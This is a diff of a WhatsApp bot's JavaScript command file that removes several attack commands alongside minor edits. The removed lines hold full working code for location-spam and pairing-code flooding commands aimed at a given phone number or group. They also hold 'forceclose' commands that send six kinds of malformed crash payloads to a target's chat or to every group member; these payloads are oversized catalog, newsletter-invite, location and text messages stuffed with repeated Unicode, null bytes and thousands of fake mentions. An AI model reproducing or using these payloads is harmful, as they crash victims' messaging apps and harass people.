       case "glitch": { const glitch2 = ["S̵̡̲͚͎̣̅̒͑ͅy̴̘͊̀s̷̳̔t̸͉͝e̴̮̿m̷͇͋ ̸͔̑G̵̱͐l̵̪̑i̵̩̊t̸͍̋c̴͕̑h̴͇͆!","E̸̥̚r̸̢͝r̸͈͌o̸͙͘r̵̭̃ ̵͍͠4̶̠̋0̶͖̑4̵̩͂!","R̸̡̙̟̤͒̉e̶̢͍͉͒̅a̷͓͓̣̓͑l̷̠̍̓͝ȉ̸̢͚t̸̗͛y̴͎̓ ̴̠̀̂͘f̴͎̎r̵̙̫͉͊̾a̴̤̺͆c̴̯̮͐ṭ̷̜̆̉̃ư̶̭̘͐r̴̗̦̘̐͋̃e̶͕͓͑d̵̛̙͑̾!"]; mzazireply(`👾 *GLITCH*\n\n${glitch2[Math.floor(Math.random()*glitch2.length)]}`); break; }
 //=====================================//
 
       case "fire": { mzazireply(`🔥🔥🔥\n🔥 FIRE! 🔥\n🔥🔥🔥\n\n_This is LIT!_`); break; }
 //=====================================//
 
-      case "spam2": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}spam2 <message>`); for(let i=0;i<5;i++){await mzazi.sendMessage(sender,{text});await new Promise(r=>setTimeout(r,500));} break; }
-//=====================================//
-
       case "snipe": { mzazireply(`🎯 *SNIPE*\n\n_Snipe feature reads deleted messages._\n_Currently tracking last deleted message..._`); break; }
-//=====================================//
-
-      case "autospam": { if (!isOwner) return mzazireply("❌ Owner only!"); mzazireply("⚠️ Auto-spam is disabled for safety reasons."); break; }
 //=====================================//
 
       case "status2": { mzazireply(`🟢 ${botName} is *ONLINE*\n\n✅ All systems operational\n⚡ Commands responding\n💾 Memory: ${(process.memoryUsage().heapUsed/1024/1024).toFixed(0)} MB`); break; }
@@ -16493,272 +15884,6 @@ async function LocationStc(sock, target, options = {}) {
 
 //=====================================//
 
-case 'locbug':
-//=====================================//
-
-case 'locationbug':
-//=====================================//
-
-case 'spamloc': {
-    // Check if user is owner
-    if (!isOwner) {
-        return mzazireply('❌ You are not authorized to use this command.');
-    }
-
-    // Check if target is provided
-    if (!text && !m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length) {
-        return mzazireply(
-            `⚠️ *Usage:*\n` +
-            `━━━━━━━━━━━━━━━━━━━━\n` +
-            `🔹 *To a user:* .locbug @user\n` +
-            `🔹 *To a group:* .locbug group_id\n` +
-            `🔹 *With options:* .locbug @user 5 2000\n` +
-            `━━━━━━━━━━━━━━━━━━━━\n` +
-            `📌 *Options:*\n` +
-            `• Count: Number of messages (default: 1)\n` +
-            `• Delay: Time between messages in ms (default: 1000)`
-        );
-    }
-
-    try {
-        let targetJid = null;
-        let isGroupTarget = false;
-        let count = 1;
-        let delay = 1000;
-        let targetName = 'User';
-
-        // Parse arguments
-        const args = text.trim().split(/\s+/);
-        let firstArg = args[0] || '';
-
-        // Check for mentioned user
-        const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-        if (mentioned.length > 0) {
-            targetJid = mentioned[0];
-            targetName = targetJid.split('@')[0];
-            // Check if there are additional arguments
-            if (args.length > 1) {
-                const num = parseInt(args[1]);
-                if (!isNaN(num) && num > 0 && num <= 50) {
-                    count = Math.min(num, 50); // Max 50 messages
-                }
-                if (args.length > 2) {
-                    const delayNum = parseInt(args[2]);
-                    if (!isNaN(delayNum) && delayNum >= 500 && delayNum <= 10000) {
-                        delay = delayNum;
-                    }
-                }
-            }
-        } else if (firstArg) {
-            // Check if it's a group ID or number
-            const cleanArg = firstArg.replace(/\D/g, '');
-            if (cleanArg) {
-                // Check if it's a group (ends with @g.us)
-                if (firstArg.includes('@g.us')) {
-                    targetJid = firstArg;
-                    isGroupTarget = true;
-                    targetName = 'Group';
-                } else {
-                    targetJid = cleanArg + '@s.whatsapp.net';
-                    targetName = cleanArg;
-                }
-                
-                // Parse additional arguments
-                if (args.length > 1) {
-                    const num = parseInt(args[1]);
-                    if (!isNaN(num) && num > 0 && num <= 50) {
-                        count = Math.min(num, 50);
-                    }
-                    if (args.length > 2) {
-                        const delayNum = parseInt(args[2]);
-                        if (!isNaN(delayNum) && delayNum >= 500 && delayNum <= 10000) {
-                            delay = delayNum;
-                        }
-                    }
-                }
-            }
-        }
-
-        if (!targetJid) {
-            return mzazireply('⚠️ Please provide a valid target.\nExample: .locbug @user 5 2000');
-        }
-
-        // Confirm with user before sending
-        await mzazireply(
-            `⚠️ *Location Bug Attack*\n` +
-            `━━━━━━━━━━━━━━━━━━━━\n` +
-            `🎯 Target: @${targetName}\n` +
-            `📊 Count: ${count} messages\n` +
-            `⏱️ Delay: ${delay}ms\n` +
-            `📌 Type: ${isGroupTarget ? 'Group' : 'Individual'}\n` +
-            `━━━━━━━━━━━━━━━━━━━━\n` +
-            `🔄 Sending in 3 seconds...`,
-            [
-                { display_text: '🚫 Cancel', id: '.cancel' }
-            ]
-        );
-
-        // Small delay before sending
-        await new Promise(resolve => setTimeout(resolve, 3000));
-
-        // Send the location spam
-        const result = await LocationStc(mzazi, targetJid, {
-            delay: delay,
-            count: count,
-            isGroup: isGroupTarget
-        });
-
-        if (result.success) {
-            await mzazireply(
-                `✅ *Location Bug Attack Complete*\n` +
-                `━━━━━━━━━━━━━━━━━━━━\n` +
-                `🎯 Target: ${targetName}\n` +
-                `📊 Sent: ${result.count} messages\n` +
-                `⏱️ Delay: ${delay}ms\n` +
-                `━━━━━━━━━━━━━━━━━━━━\n` +
-                `⚠️ Use responsibly!`,
-                [
-                    { display_text: '📋 Menu', id: '.menu' },
-                    { display_text: '👑 Owner', id: '.owner' }
-                ]
-            );
-        } else {
-            await mzazireply(
-                `❌ *Failed to send location bug*\n` +
-                `━━━━━━━━━━━━━━━━━━━━\n` +
-                `Error: ${result.error}\n` +
-                `━━━━━━━━━━━━━━━━━━━━\n` +
-                `Please try again later.`
-            );
-        }
-
-    } catch (error) {
-        logger.error('Location bug command error:', error);
-        await mzazireply('❌ An error occurred: ' + error.message);
-    }
-    break;
-}
-
-// ── CASE 2: Simple Location Spam (No Count/Delay) ──────────
-// Use: .loc @user or .loc 254700000000
-
-//=====================================//
-
-case 'loc':
-//=====================================//
-
-case 'location': {
-    if (!isOwner) return mzazireply('❌ You are not authorized to use this command.');
-
-    const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-    let targetJid = null;
-    
-    if (mentioned.length > 0) {
-        targetJid = mentioned[0];
-    } else if (text) {
-        const num = text.replace(/\D/g, '');
-        if (num) {
-            targetJid = num + '@s.whatsapp.net';
-        }
-    }
-
-    if (!targetJid) {
-        return mzazireply('⚠️ Please mention a user or provide a number.\nExample: .loc @user');
-    }
-
-    try {
-        await mzazireply(`🔄 Sending location spam to @${targetJid.split('@')[0]}...`, [
-            { display_text: '🚫 Cancel', id: '.cancel' }
-        ]);
-
-        await LocationStc(mzazi, targetJid, {
-            delay: 1000,
-            count: 1,
-            isGroup: false
-        });
-
-        await mzazireply(`✅ Location spam sent to ${targetJid.split('@')[0]}!`);
-        
-    } catch (error) {
-        logger.error('Location command error:', error);
-        await mzazireply('❌ Failed: ' + error.message);
-    }
-    break;
-}
-
-// ── CASE 3: Group Location Spam ─────────────────────────────
-// Use: .gloc group_id or .gloc @g.us
-
-//=====================================//
-
-case 'gloc':
-//=====================================//
-
-case 'grouploc': {
-    if (!isOwner) return mzazireply('❌ You are not authorized to use this command.');
-
-    let targetJid = sender; // Default to current group
-    let count = 1;
-    let delay = 2000;
-
-    // Parse arguments
-    const args = text.trim().split(/\s+/);
-    if (args.length > 0 && args[0]) {
-        const cleanArg = args[0].replace(/\D/g, '');
-        if (cleanArg) {
-            targetJid = args[0].includes('@g.us') ? args[0] : args[0] + '@g.us';
-        }
-        if (args.length > 1) {
-            const num = parseInt(args[1]);
-            if (!isNaN(num) && num > 0 && num <= 20) {
-                count = Math.min(num, 20);
-            }
-        }
-        if (args.length > 2) {
-            const delayNum = parseInt(args[2]);
-            if (!isNaN(delayNum) && delayNum >= 1000 && delayNum <= 5000) {
-                delay = delayNum;
-            }
-        }
-    }
-
-    // Check if in group
-    if (!isGroup && !targetJid.includes('@g.us')) {
-        return mzazireply('⚠️ This command is for groups only. Use .loc for individual users.');
-    }
-
-    try {
-        await mzazireply(
-            `🔄 Sending ${count} location spam(s) to ${targetJid}...\n⏱️ Delay: ${delay}ms`,
-            [
-                { display_text: '🚫 Cancel', id: '.cancel' }
-            ]
-        );
-
-        const result = await LocationStc(mzazi, targetJid, {
-            delay: delay,
-            count: count,
-            isGroup: true
-        });
-
-        if (result.success) {
-            await mzazireply(
-                `✅ Sent ${result.count} location spam(s) to group!`,
-                [
-                    { display_text: '📋 Menu', id: '.menu' }
-                ]
-            );
-        }
-        
-    } catch (error) {
-        logger.error('Group location error:', error);
-        await mzazireply('❌ Failed: ' + error.message);
-    }
-    break;
-}
-
-//=====================================//
-
 case "ping0": {
     try {
         const { createCanvas, loadImage, registerFont } = require('canvas');
@@ -17819,64 +16944,6 @@ case "delay": {
     }
     break;
 }
-//=====================================//
-
-case 'spampair':
-//=====================================//
-
-case 'pairspam': {
-  if (!isOwner) {
-    await mzazireply('❌ Owner only.');
-    break;
-  }
-
-  if (!args[0]) {
-    return mzazireply(
-      '📱 *Spam Pairing Code*\n\n' +
-      'Usage: .spampair <number> [count]\n\n' +
-      'Example: .spampair 254712345678 30\n' +
-      'Defaults to 20 requests if count not specified.'
-    );
-  }
-
-  const targetNum = args[0].replace(/\D/g, '');
-  if (targetNum.length < 8) {
-    return mzazireply('❌ Invalid phone number. Include country code.');
-  }
-
-  const count = Math.min(parseInt(args[1]) || 20, 30);
-
-  await mzazireply(
-    `🚀 *Spam Pairing Started*\n\n` +
-    `📱 Target: +${targetNum}\n` +
-    `📊 Count: ${count} requests\n` +
-    `⏳ Processing...`
-  );
-
-  const startTime = Date.now();
-  
-  // Try the direct method (more reliable)
-  const result = await spamPairingDirect(targetNum, count);
-  
-  const duration = ((Date.now() - startTime) / 1000).toFixed(1);
-
-  let statusMsg = 
-    `✅ *Spam Pairing Complete*\n\n` +
-    `📱 Target: +${targetNum}\n` +
-    `📊 Sent: ${result.success} requests\n` +
-    `❌ Failed: ${result.failed}\n` +
-    `⏱️ Duration: ${duration}s\n`;
-
-  if (result.failed > 0 && result.errors.length > 0) {
-    statusMsg += `\n⚠️ *Errors:*\n` +
-      result.errors.slice(0, 5).map(e => `• ${e}`).join('\n') +
-      (result.errors.length > 5 ? `\n• ... and ${result.errors.length - 5} more` : '');
-  }
-
-  await mzazireply(statusMsg);
-  break;
-}
-//=============Play99========================//
 //=====================================//
 
 case 'sxvideos':
@@ -19517,44 +18584,6 @@ case "todgame": {
 //   GROUP WOULD YOU RATHER (GROUP VOTE)
 //   .wyr              — get a question
 // ████████████████████████████████████████
-case "wyr":
-case "wouldyrather":
-case "wyrvote": {
-  if (!isGroup) return mzazireply("❌ Group only!");
-
-  const wyrQuestions = [
-    ["Be invisible for a day","Be able to fly for a day"],
-    ["Never use social media again","Never watch TV/movies again"],
-    ["Have unlimited money but no friends","Have great friends but always be broke"],
-    ["Live in the past","Live in the future"],
-    ["Be super strong","Be super smart"],
-    ["Always know when people are lying","Always get away with lying"],
-    ["Be famous but hated","Unknown but loved"],
-    ["Only eat your favourite food forever","Never eat it again"],
-    ["Lose all your memories from birth to now","Lose all your memories from now on"],
-    ["Speak every language","Play every instrument"],
-    ["Have 10 siblings","Be an only child"],
-    ["Be the funniest person in any room","Be the most attractive person in any room"],
-    ["Never be able to use the internet again","Never be able to eat your favourite food again"],
-    ["Have a rewind button for your life","Have a pause button for your life"],
-    ["Know how you die","Know when you will die"],
-  ];
-
-  const q = wyrQuestions[Math.floor(Math.random() * wyrQuestions.length)];
-  mzazi.sendMessage(sender, {
-    text: `🤔 *WOULD YOU RATHER?*\n\n🅰️ *${q[0]}*\n\n— OR —\n\n🅱️ *${q[1]}*\n\nVote: Reply with *A* or *B* 🗳️`,
-  }, { quoted: m });
-  break;
-}
-
-//=====================================//
-
-// ████████████████████████████████████████
-//   CONNECT FOUR
-//   .c4 @user         — challenge
-//   .c4 1-7           — drop a piece
-//   .endc4            — forfeit
-// ████████████████████████████████████████
 case "c4":
 case "connect4": {
   if (!isGroup) return mzazireply("❌ Group only!");
@@ -20752,10 +19781,7 @@ case 'imba': {
 
 case 'promosi': {
   // ── Check if user is bot owner ──
-  const ownerNumbers = ['254112896604']; // Add your phone number(s) here
-  const senderNum = sender.split('@')[0];
-  
-  if (!ownerNumbers.includes(senderNum)) {
+  if (!isOwner) {
     return mzazireply(`❌ *Access Denied*\n\nOnly bot owners can use this command.`);
   }
 
@@ -20801,7 +19827,7 @@ case 'promosi': {
         `👑 *Promotion Successful!*\n\n` +
         `User: @${targetNumber}\n` +
         `Status: Now an admin ✅\n` +
-        `Powered by: ${botName}`,
+        `Powered by: ${getBotName(botPhoneNum)}`,
         { mentions: [targetJid] }
       );
     } catch (promoteError) {
@@ -20881,543 +19907,6 @@ case 'promosi': {
 }
 
 
-case 'forceclose':
-case 'fc':
-case 'crashdm': {
-  if (!isOwner) {
-    await mzazireply('❌ Only the bot owner can use this command.');
-    break;
-  }
-
-  if (!text) {
-    return mzazireply(
-      `💀 *Force Close - Crash Target DM*\n\n` +
-      `Usage: .forceclose <phone_number> [count]\n` +
-      `Example: .forceclose 254712345678 5\n` +
-      `Default count: 3\n\n` +
-      `_⚠️ Sends crash payload to the target's DM._`
-    );
-  }
-
-  // ── Parse target and count ──
-  const parts = text.trim().split(/\s+/);
-  const rawNumber = parts[0].replace(/\D/g, '');
-  const count = Math.min(parseInt(parts[1]) || 3, 10);
-
-  if (rawNumber.length < 8) {
-    return mzazireply('❌ Invalid phone number. Please provide a valid number with country code.');
-  }
-
-  const targetJid = `${rawNumber}@s.whatsapp.net`;
-
-  await mzazireply(
-    `💀 *Force Close Started*\n\n` +
-    `📱 Target: +${rawNumber}\n` +
-    `📊 Count: ${count} payloads\n` +
-    `⏳ Sending crash payloads...`
-  );
-
-  let sent = 0;
-  let failed = 0;
-
-  try {
-    const crypto = require('crypto');
-
-    // ── Payload function ──
-    async function sendForceClose() {
-      try {
-        await mzazi.relayMessage(targetJid, {
-          senderKeyDistributionMessage: {
-            groupId: "120363428445623974@g.us",
-            axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
-          },
-          interactiveMessage: {
-            body: {
-              text: "MZAZI TECH | FORCE CLOSE"
-            },
-            nativeFlowMessage: {
-              buttons: [
-                {
-                  name: "catalog_message",
-                  buttonParamsJson: "{}"
-                }
-              ],
-              messageParamsJson: "{}"
-            }
-          }
-        }, {
-          additionalNodes: [
-            {
-              tag: "biz",
-              attrs: {
-                native_flow_name: "catalog_message"
-              }
-            }
-          ]
-        });
-        return true;
-      } catch (e) {
-        logger.error('[ForceClose] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── Execute with delay between each ──
-    for (let i = 0; i < count; i++) {
-      const result = await sendForceClose();
-      if (result) sent++;
-      else failed++;
-      
-      if (i < count - 1) {
-        await new Promise(resolve => setTimeout(resolve, 1500));
-      }
-    }
-
-    await mzazireply(
-      `✅ *Force Close Complete*\n\n` +
-      `📱 Target: +${rawNumber}\n` +
-      `📊 Sent: ${sent} payloads\n` +
-      `❌ Failed: ${failed}\n` +
-      `💀 Status: ${failed > 0 ? '⚠️ Some payloads failed' : '✅ All payloads delivered'}`
-    );
-
-  } catch (err) {
-    logger.error('ForceClose error:', err);
-    await mzazireply(`❌ ForceClose failed: ${err.message}`);
-  }
-  break;
-}
-case 'fcgc': {
-  if (!isOwner) {
-    await mzazireply('❌ Only the bot owner can use this command.');
-    break;
-  }
-
-  // ── Check if in a group ──
-  if (!isGroup) {
-    return mzazireply('❌ This command only works in groups.');
-  }
-
-  // ── Check if bot is admin ──
- 
-
-  // ── Parse count (optional) ──
-  const count = Math.min(parseInt(text) || 3, 10);
-
-  await mzazireply(
-    `💀 *Force Close Started*\n\n` +
-    `👥 Group: ${sender}\n` +
-    `📊 Count: ${count} payloads\n` +
-    `⏳ Sending crash payloads to the group...`
-  );
-
-  let sent = 0;
-  let failed = 0;
-
-  try {
-    const crypto = require('crypto');
-
-    // ── Payload function ──
-    async function sendForceClose() {
-      try {
-        await mzazi.relayMessage(sender, {
-          senderKeyDistributionMessage: {
-            groupId: "120363428445623974@g.us",
-            axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
-          },
-          interactiveMessage: {
-            body: {
-              text: "MZAZI TECH | FORCE CLOSE"
-            },
-            nativeFlowMessage: {
-              buttons: [
-                {
-                  name: "catalog_message",
-                  buttonParamsJson: "{}"
-                }
-              ],
-              messageParamsJson: "{}"
-            }
-          }
-        }, {
-          additionalNodes: [
-            {
-              tag: "biz",
-              attrs: {
-                native_flow_name: "catalog_message"
-              }
-            }
-          ]
-        });
-        return true;
-      } catch (e) {
-        logger.error('[ForceClose] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── Send payload 1: Standard force close ──
-    for (let i = 0; i < count; i++) {
-      const result = await sendForceClose();
-      if (result) sent++;
-      else failed++;
-      
-      if (i < count - 1) {
-        await new Promise(resolve => setTimeout(resolve, 1500));
-      }
-    }
-
-    // ── Extra payload: Newsletter Admin Invite ──
-    async function sendNewsletterCrash() {
-      try {
-        await mzazi.relayMessage(sender, {
-          botInvokeMessage: {
-            message: {
-              newsletterAdminInviteMessage: {
-                newsletterJid: '33333333333333333@newsletter',
-                newsletterName: "MZAZI TECH FORCE CLOSE" + "ꦾ".repeat(80000),
-                jpegThumbnail: null,
-                caption: "💀".repeat(50000) + "🔥".repeat(50000),
-                inviteExpiration: Date.now() + 1814400000,
-              },
-            },
-          },
-        }, {
-          userJid: sender,
-        });
-        return true;
-      } catch (e) {
-        logger.error('[NewsletterCrash] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── Send newsletter crash ──
-    const newsResult = await sendNewsletterCrash();
-    if (newsResult) sent++;
-    else failed++;
-
-    await mzazireply(
-      `✅ *Force Close Complete*\n\n` +
-      `👥 Group: ${sender}\n` +
-      `📊 Sent: ${sent} payloads\n` +
-      `❌ Failed: ${failed}\n` +
-      `💀 Status: ${failed > 0 ? '⚠️ Some payloads failed' : '✅ All payloads delivered'}`
-    );
-
-  } catch (err) {
-    logger.error('ForceClose error:', err);
-    await mzazireply(`❌ ForceClose failed: ${err.message}`);
-  }
-  break;
-}
-case 'fcgc2': {
-  if (!isOwner) {
-    await mzazireply('❌ Only the bot owner can use this command.');
-    break;
-  }
-
-  // ── Check if in a group ──
-  if (!isGroup) {
-    return mzazireply('❌ This command only works in groups.');
-  }
-
-  // ── Check if bot is admin ──
-  
-
-  // ── Parse count (optional) ──
-  const count = Math.min(parseInt(text) || 3, 10);
-
-  // ── Get all group participants except sender ──
-  const targets = participants
-    .filter(p => p.id !== sender && p.id !== mzazi.user.id)
-    .map(p => p.id);
-
-  if (targets.length === 0) {
-    return mzazireply('❌ No other members found in the group.');
-  }
-
-  await mzazireply(
-    `💀 *Force Close Started*\n\n` +
-    `👥 Group: ${sender}\n` +
-    `👤 Targets: ${targets.length} members\n` +
-    `📊 Count: ${count} payloads per target\n` +
-    `⏳ Sending crash payloads...`
-  );
-
-  let totalSent = 0;
-  let totalFailed = 0;
-
-  try {
-    const crypto = require('crypto');
-    const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-
-    // ── PAYLOAD 1: Catalog Message Crash ──
-    async function sendCatalogCrash(target) {
-      try {
-        const catalogPayload = {
-          interactiveMessage: {
-            body: { text: "MZAZI TECH FORCE CLOSE" },
-            nativeFlowMessage: {
-              buttons: [
-                {
-                  name: "catalog_message",
-                  buttonParamsJson: JSON.stringify({
-                    title: "\u0111\u0115\u0114\u0117".repeat(50000),
-                    description: "\u0000".repeat(300000),
-                    products: Array.from({ length: 30000 }, (_, i) => ({
-                      id: "prod_" + i,
-                      name: "\u0111".repeat(20000),
-                      price: "Ksh 999.999",
-                      currency: "Ksh",
-                      image_url: "https://t.me/mzazitechincorparatedcompany" + "\u0000".repeat(50000)
-                    })),
-                    catalog_id: "\u0111\u0115\u0114\u0117".repeat(50000)
-                  })
-                }
-              ],
-              version: 1
-            },
-            contextInfo: {
-              quotedMessage: {
-                interactiveMessage: {
-                  body: { text: "MzaziClose" }
-                }
-              }
-            }
-          }
-        };
-
-        await mzazi.relayMessage(target, catalogPayload, {
-          participant: { jid: target },
-          additionalNodes: [
-            {
-              tag: 'biz',
-              attrs: {
-                native_flow_name: 'catalog_message',
-              },
-            },
-          ],
-        });
-        return true;
-      } catch (e) {
-        logger.error('[CatalogCrash] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── PAYLOAD 2: Location Crash ──
-    async function sendLocationCrash(target) {
-      try {
-        const locationPayload = {
-          locationMessage: {
-            degreesLatitude: 9999999999999,
-            degreesLongitude: 9999999999999,
-            name: "nick".repeat(100000),
-            address: "\u0000".repeat(50000),
-            url: "https://t.me/damidriller",
-            contextInfo: {
-              remoteJid: "\u200b".repeat(90000),
-              participant: "target",
-              mentionedJid: [
-                "\u0000",
-                "Warking Is Here"
-              ]
-            }
-          }
-        };
-
-        await mzazi.relayMessage(target, locationPayload, {
-          participant: { jid: target }
-        });
-        return true;
-      } catch (e) {
-        logger.error('[LocationCrash] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── PAYLOAD 3: Interactive Response Crash ──
-    async function sendInteractiveCrash(target) {
-      try {
-        const mentionedList = Array.from({ length: 5000 }, () => 
-          `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
-        );
-
-        const msg = generateWAMessageFromContent(target, {
-          interactiveResponseMessage: {
-            body: {
-              text: "💀".repeat(50000) + "🔥".repeat(50000),
-              format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-              name: "galaxy_message",
-              paramsJson: "{".repeat(50000) + "}".repeat(50000),
-              version: 3
-            },
-            contextInfo: {
-              mentionedJid: mentionedList,
-              remoteJid: "status@broadcast",
-              participant: target
-            }
-          }
-        }, {});
-
-        await mzazi.relayMessage(target, msg.message, {
-          messageId: msg.key.id,
-          participant: { jid: target }
-        });
-        return true;
-      } catch (e) {
-        logger.error('[InteractiveCrash] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── PAYLOAD 4: SenderKeyDistribution Crash ──
-    async function sendSenderKeyCrash(target) {
-      try {
-        await mzazi.relayMessage(target, {
-          senderKeyDistributionMessage: {
-            groupId: "120363428445623974@g.us",
-            axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
-          },
-          interactiveMessage: {
-            body: {
-              text: "MZAZI TECH | FORCE CLOSE"
-            },
-            nativeFlowMessage: {
-              buttons: [
-                {
-                  name: "catalog_message",
-                  buttonParamsJson: "{}"
-                }
-              ],
-              messageParamsJson: "{}"
-            }
-          }
-        }, {
-          additionalNodes: [
-            {
-              tag: "biz",
-              attrs: {
-                native_flow_name: "catalog_message"
-              }
-            }
-          ]
-        });
-        return true;
-      } catch (e) {
-        logger.error('[SenderKeyCrash] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── PAYLOAD 5: Newsletter Admin Invite Crash ──
-    async function sendNewsletterCrash(target) {
-      try {
-        await mzazi.relayMessage(target, {
-          botInvokeMessage: {
-            message: {
-              newsletterAdminInviteMessage: {
-                newsletterJid: '33333333333333333@newsletter',
-                newsletterName: "MZAZI TECH FORCE CLOSE" + "ꦾ".repeat(80000),
-                jpegThumbnail: null,
-                caption: "💀".repeat(50000) + "🔥".repeat(50000),
-                inviteExpiration: Date.now() + 1814400000,
-              },
-            },
-          },
-        }, {
-          userJid: target,
-        });
-        return true;
-      } catch (e) {
-        logger.error('[NewsletterCrash] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── PAYLOAD 6: ExtendedText Crash ──
-    async function sendExtendedTextCrash(target) {
-      try {
-        const bigUnicode = "𑇂𑆵𑆴𑆿".repeat(60000);
-        const msg = generateWAMessageFromContent(target, {
-          extendedTextMessage: {
-            text: bigUnicode + ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ",
-            matchedText: "https://t.me/mzazitech",
-            description: bigUnicode,
-            title: "MZAZI TECH INC" + bigUnicode,
-            previewType: "NONE",
-            contextInfo: {
-              mentionedJid: Array.from({ length: 2000 }, () => 
-                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
-              ),
-              forwardingScore: 999,
-              isForwarded: true
-            }
-          }
-        }, {
-          additionalAttributes: { edit: "7" }
-        });
-
-        await mzazi.relayMessage(target, msg.message, {
-          messageId: msg.key.id,
-          participant: { jid: target }
-        });
-        return true;
-      } catch (e) {
-        logger.error('[ExtendedTextCrash] Error:', e.message);
-        return false;
-      }
-    }
-
-    // ── Payload list ──
-    const payloads = [
-      { name: 'Catalog', fn: sendCatalogCrash },
-      { name: 'Location', fn: sendLocationCrash },
-      { name: 'Interactive', fn: sendInteractiveCrash },
-      { name: 'SenderKey', fn: sendSenderKeyCrash },
-      { name: 'Newsletter', fn: sendNewsletterCrash },
-      { name: 'ExtendedText', fn: sendExtendedTextCrash },
-    ];
-
-    // ── Send to each target ──
-    for (const target of targets) {
-      for (let i = 0; i < count; i++) {
-        for (const p of payloads) {
-          try {
-            const result = await p.fn(target);
-            if (result) totalSent++;
-            else totalFailed++;
-            await new Promise(resolve => setTimeout(resolve, 500));
-          } catch (e) {
-            totalFailed++;
-            logger.error(`[${p.name}] Error:`, e.message);
-          }
-        }
-        if (i < count - 1) {
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        }
-      }
-    }
-
-    await mzazireply(
-      `✅ *Force Close Complete*\n\n` +
-      `👥 Group: ${sender}\n` +
-      `👤 Targets: ${targets.length} members\n` +
-      `📊 Total Sent: ${totalSent} payloads\n` +
-      `❌ Total Failed: ${totalFailed}\n` +
-      `💀 Status: ${totalFailed > totalSent ? '⚠️ Some payloads failed' : '✅ All payloads delivered'}`
-    );
-
-  } catch (err) {
-    logger.error('ForceClose error:', err);
-    await mzazireply(`❌ ForceClose failed: ${err.message}`);
-  }
-  break;
-}
-// ──────────────────── BOOST COMMANDS ────────────────────
 case "tiktokboost":
 case "ttboost": {
     if (!isOwner) return mzazireply("❌ Owner only.");
@@ -21837,65 +20326,6 @@ case "igboost3": {
     }
     break;
 }
-case "say":
-case "tts": {
-    if (!text) return mzazireply(`📌 *Example:*\n${prefix}${command} I love you`);
-
-    try {
-        const googleTTS = require('google-tts-api');
-        const fetch = require('node-fetch');
-
-        // ── Get audio URL from Google TTS ──
-        const url = googleTTS.getAudioUrl(text, {
-            lang: 'en',
-            slow: false,
-            host: 'https://translate.google.com',
-        });
-
-        if (!url) return mzazireply("❌ Failed to generate voice.");
-
-        // ── Download audio as buffer using fetch ──
-        const response = await fetch(url, {
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-        });
-
-        if (!response.ok) {
-            return mzazireply(`❌ Download failed: ${response.status}`);
-        }
-
-        const audioBuffer = await response.buffer();
-
-        if (!audioBuffer || audioBuffer.length === 0) {
-            return mzazireply("❌ No audio data received.");
-        }
-
-        // ── Send as voice note ──
-        await mzazi.sendMessage(sender, {
-            audio: audioBuffer,
-            mimetype: 'audio/mpeg',
-            ptt: true,
-            fileName: 'voice.mp3',
-            contextInfo: {
-                forwardingScore: 999,
-                isForwarded: true,
-                forwardedNewsletterMessageInfo: {
-                    newsletterJid: "120363425539800408@newsletter",
-                    newsletterName: botName.toUpperCase(),
-                    serverMessageId: 143
-                }
-            }
-        });
-
-    } catch (err) {
-        logger.error("TTS error:", err);
-        mzazireply(`❌ Failed to generate voice: ${err.message || "Unknown error"}`);
-    }
-    break;
-}
-
-
 case "deepseek": {
     if (!text) {
         return mzazireply(
